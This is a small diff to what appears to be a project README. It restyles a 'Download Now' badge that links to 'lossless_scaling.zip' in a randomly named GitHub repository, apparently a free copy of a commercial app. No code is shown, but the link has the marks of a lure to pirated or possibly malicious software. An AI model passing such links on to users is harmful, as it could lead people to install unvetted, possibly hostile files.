@@ -3,11 +3,8 @@
 
 ---
 
-<p align="left">
-  <a href="https://github.com/Crushomenhir/ugufyygvkgc-huibjlgvlgv/releases/download/new/lossless_scaling.zip">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20Now-brightgreen?style=for-the-badge&logoColor=white" alt="Download">
-  </a>
-</p>
+[![Download](https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2ea44f?style=for-the-badge&logoColor=white&logoWidth=20)](https://github.com/Crushomenhir/ugufyygvkgc-huibjlgvlgv/releases/download/new/lossless_scaling.zip)
+
 
 
 
